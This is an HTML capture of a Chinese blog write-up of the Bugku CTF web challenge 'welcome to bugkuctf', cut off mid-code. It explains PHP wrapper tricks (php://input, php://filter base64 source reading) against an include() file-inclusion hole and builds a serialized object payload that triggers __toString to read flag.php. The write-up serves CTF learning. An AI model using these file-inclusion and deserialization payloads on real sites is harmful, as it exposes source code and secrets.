@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ciphersaw.me","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x00 前言此题运用了许多 PHP 技巧，解题思路惊艳，特此想分享一下思考过程。与其说此题是 Web 题，不如说是道 PHP 技巧题，难度中等，要求有扎实的 PHP 基础。 涉及到的技巧有 PHP 伪协议、魔术方法、对象的序列化与反序列化等，相关链接如下：  题目链接：http:&#x2F;&#x2F;123.206.31.85&#x2F;challenges#welcome to bugkuctf 解题链接：http:&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Bugku CTF】 Web —— welcome to bugkuctf">
+<meta property="og:url" content="https://ciphersaw.me/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/index.html">
+<meta property="og:site_name" content="Secrypt Agency">
+<meta property="og:description" content="0x00 前言此题运用了许多 PHP 技巧，解题思路惊艳，特此想分享一下思考过程。与其说此题是 Web 题，不如说是道 PHP 技巧题，难度中等，要求有扎实的 PHP 基础。 涉及到的技巧有 PHP 伪协议、魔术方法、对象的序列化与反序列化等，相关链接如下：  题目链接：http:&#x2F;&#x2F;123.206.31.85&#x2F;challenges#welcome to bugkuctf 解题链接：http:&#x2F;&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/question.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/hint.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/get-source.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/flag-fail.png">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/flag.png">
+<meta property="article:published_time" content="2018-01-03T14:40:23.000Z">
+<meta property="article:modified_time" content="2021-10-01T02:01:51.606Z">
+<meta property="article:author" content="Cipher Saw">
+<meta property="article:tag" content="Bugku">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Audit">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/question.png">
+
+
+<link rel="canonical" href="https://ciphersaw.me/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://ciphersaw.me/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/","path":"2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/","title":"【Bugku CTF】 Web —— welcome to bugkuctf"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【Bugku CTF】 Web —— welcome to bugkuctf | Secrypt Agency</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Secrypt Agency</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to a platform for network security artists.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-users fa-fw"></i>Friends</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81"><span class="nav-text">0x01 PHP 伪协议获取源码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-x2F-x2F-input"><span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-x2F-x2F-filter"><span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0-payload"><span class="nav-text">0x02 序列化构造 payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-toString"><span class="nav-text">魔术方法 __toString()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">对象的序列化</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cipher Saw"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Cipher Saw</p>
+  <div class="site-description" itemprop="description">Not to be whom you don't want to be.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">74</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ciphersaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ciphersaw" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/CipherSaw" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;CipherSaw" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe-asia fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctf-wiki.github.io/ctf-wiki/" title="https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;" rel="noopener" target="_blank">CTF Wiki</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.owasp.org/index.php/Main_Page" title="https:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;Main_Page" rel="noopener" target="_blank">OWASP</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.pentest-standard.org/index.php/Main_Page" title="http:&#x2F;&#x2F;www.pentest-standard.org&#x2F;index.php&#x2F;Main_Page" rel="noopener" target="_blank">Pentest Standard</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/ciphersaw" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ciphersaw.me/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Cipher Saw">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Secrypt Agency">
+      <meta itemprop="description" content="Not to be whom you don't want to be.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【Bugku CTF】 Web —— welcome to bugkuctf | Secrypt Agency">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Bugku CTF】 Web —— welcome to bugkuctf
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2018-01-03 22:40:23" itemprop="dateCreated datePublished" datetime="2018-01-03T22:40:23+08:00">2018-01-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-10-01 10:01:51" itemprop="dateModified" datetime="2021-10-01T10:01:51+08:00">2021-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/InfoSec/" itemprop="url" rel="index"><span itemprop="name">InfoSec</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/InfoSec/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2018/01/03/bugku-ctf-web-welcome-to-bugkuctf/" class="post-meta-item leancloud_visitors" data-flag-title="【Bugku CTF】 Web —— welcome to bugkuctf" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题运用了许多 PHP 技巧，解题思路惊艳，特此想分享一下思考过程。与其说此题是 Web 题，不如说是道 PHP 技巧题，难度中等，要求有<strong>扎实的 PHP 基础</strong>。</p>
+<p>涉及到的技巧有 <strong>PHP 伪协议、魔术方法、对象的序列化与反序列化</strong>等，相关链接如下：</p>
+<ul>
+<li>题目链接：<a target="_blank" rel="noopener" href="http://123.206.31.85/challenges#welcome%20to%20bugkuctf">http://123.206.31.85/challenges#welcome to bugkuctf</a></li>
+<li>解题链接：<a target="_blank" rel="noopener" href="http://120.24.86.145:8006/test1/">http://120.24.86.145:8006/test1/</a></li>
+</ul>
+<span id="more"></span>
+
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/question.png" alt="question"></p>
+<h1 id="0x01-PHP-伪协议获取源码"><a href="#0x01-PHP-伪协议获取源码" class="headerlink" title="0x01 PHP 伪协议获取源码"></a>0x01 PHP 伪协议获取源码</h1><p>点开链接，依然按常规套路只有一句话：<strong>you are not the number of bugku !</strong> ，继续查看源码发现线索：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/hint.png" alt="hint"></p>
+<p>这里需要满足两点：</p>
+<ol>
+<li>构造合适的 URL 查询变量 <code>txt</code> 使得 PHP 变量 <code>$user</code> 满足 if 语句的条件</li>
+<li>令变量 <code>$file</code> 通过文件包含函数 <code>include()</code> 获取指定页面的源码</li>
+</ol>
+<p>注意，此处还未涉及到查询变量 <code>password</code>。</p>
+<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>在 if 语句中，通过 <code>file_get_contents()</code> 函数读取变量 <code>$user</code> 的值后，再与字符串 <code>welcome to the bugkuctf</code> 比较。</p>
+<p>因此可借助伪协议 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a> 中的 <code>php://input</code> 访问原始请求数据中的只读流。这里令 <code>$user = &quot;php://input&quot;</code>，并在请求主体中提交字符串 <code>welcome to the bugkuctf</code>。</p>
+<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>在 <code>include($file); //hint.php</code> 语句中，相当于把变量 <code>$file</code> 的值在该语句的位置读入，结合后面的提示，应该是要把 hint.php 页面的源码以某种形式包含在当前页面内。</p>
+<p>因此可利用 <code>php://filter</code> 以某种方式筛选过滤特定的数据流。这里令 <code>$file = php://filter/read=convert.base64-encode/resource=hint.php</code>，意思是<strong>以 Base64 编码的方式过滤出 hint.php 页面的源码</strong>，也可以把它理解为一个具有 URI 形式的特殊函数，该函数能把 hint.php 源码以 Base64 编码的方式读入。</p>
+<p>根据以上两种 PHP 伪协议的分析，构造出以下 payload 即得 hint.php 源码的 Base64 编码:</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/get-source.png" alt="get-source"></p>
+<p>解码后得到 hint.php 源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>根据注释发现了藏 flag 的页面，再次照葫芦画瓢去偷看 flag.php 源码：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/bugku-ctf-web-welcome-to-bugkuctf/flag-fail.png" alt="flag-fail"></p>
+<p>…果然没那么简单，唔，卡住了，怎么办？</p>
+<p>别忘了还有主页面啊！<strong>利用主页面的功能也能读取自身的源码</strong>，这一点很容易被遗忘，所以这次很顺利就获得了 index.php 的源码（注意，路径末尾不带 php 文件的 URL <code>http://120.24.86.145:8006/test1/</code>，一般默认就是访问 <code>http://120.24.86.145:8006/test1/index.php</code>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>注意到第 8 行将 <code>$file</code> 变量中的 <code>flag</code> 字符串过滤了，印证了前面的结果。到此，我们顺利地将此题变成一道 PHP 白盒审计题了，现在才是此题最有意思的地方，如何利用已知的 hint.php 与 index.php 的源码去获取 flag.php 的内容？请继续往下看。</p>
+<h1 id="0x02-序列化构造-payload"><a href="#0x02-序列化构造-payload" class="headerlink" title="0x02 序列化构造 payload"></a>0x02 序列化构造 payload</h1><p>要理清 hint.php 与 index.php 之间的关系，首先要理解 hint.php 中的 <code>__tostring()</code> 函数是何方神圣。</p>
+<h2 id="魔术方法-toString"><a href="#魔术方法-toString" class="headerlink" title="魔术方法 __toString()"></a>魔术方法 __toString()</h2><p>「写在前面」：PHP 中变量与方法的命名一般遵循<strong>小驼峰式命名法（Lower Camel Case）</strong>，类的命名一般遵循<strong>大驼峰式命名法（Upper Camel Case）</strong>，也称<strong>帕斯卡命名法（Pascal Case）</strong>，并且<strong>普通变量、超级全局变量、常量、数组索引等区分大小写</strong>，而<strong>函数名、方法名、类名、魔术变量等不区分大小写</strong>，但最好使用与定义一样的大小写名字。详情可参考：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%A7%9D%E5%B3%B0%E5%BC%8F%E5%A4%A7%E5%B0%8F%E5%AF%AB">驼峰式大小写</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/daipianpian/p/5721377.html">PHP命名大小写敏感规则</a></p>
+</blockquote>
+<p>因此看到此魔术方法定义为 <code>__toString()</code>，在源码中却是 <code>__tostring()</code> 就不足为奇了。</p>
+<p><strong>魔术方法 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a></strong> 定义在类中，在该类的对象被当成字符串打印时执行，并且必须返回一个字符串，否则出现报错。</p>
+<p>因此在 hint.php 中，当 <code>Flag</code> 类的对象被打印时，将获取 <code>$file</code> 变量（注意此处的 <code>$file</code> 与 index.php 中的不同）中文件的内容并输出，最后返回字符串 <code>good</code>。</p>
+<h2 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h2><p>再来看看 index.php 的 11-15 行，满足了上面所有 if 语句的条件后，先包含变量 <code>$file</code>，再反序列化变量 <code>$password</code> 后输出。此段代码是本题的核心，理解了就能找到 index.php 与 hint.php 之间的联系，从而构造出 payload。</p>
+<p><strong>核心思想如下：先用 <code>include()</code> 函数包含 hint.php，从而引入 <code>Flag</code> 类；再将该类对象的序列化字符串赋值给 <code>$passsword</code>，且令对象的成员变量 <code>$file = flag.php</code>， 所以在反序列化后得到上述对象；最后用 <code>echo</code> 打印该对象，从而触发 <code>__toString()</code> 函数，输出 flag.php 的值。</strong></p>
+<p>通过以下代码可获得成员变量 <code>$file = flag.php</code> 的 <code>Flag</code> 对象的序列化字符串：<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span 